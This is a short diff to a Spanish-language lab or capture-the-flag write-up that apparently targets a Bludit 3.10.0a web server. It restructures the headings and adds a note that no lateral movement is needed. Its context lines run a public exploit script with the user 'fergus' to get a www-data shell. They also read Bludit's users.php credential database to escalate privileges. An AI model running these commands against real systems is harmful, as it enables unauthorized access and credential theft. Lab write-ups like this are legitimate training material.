@@ -87,7 +87,12 @@ python3 48568.py -u http://<IP> -user fergus -pass '<password>' \
 
 Shell como `www-data`.
 
-## Escalada
+## Movimiento lateral
+
+- No aplica: la cadena se resuelve en un único host, sin salto lateral.
+- Ver «Escalada de privilegios» para el paso de usuario a administrador.
+
+## Escalada de privilegios
 
 ```bash
 cat /var/www/bludit-3.10.0a/bl-content/databases/users.php
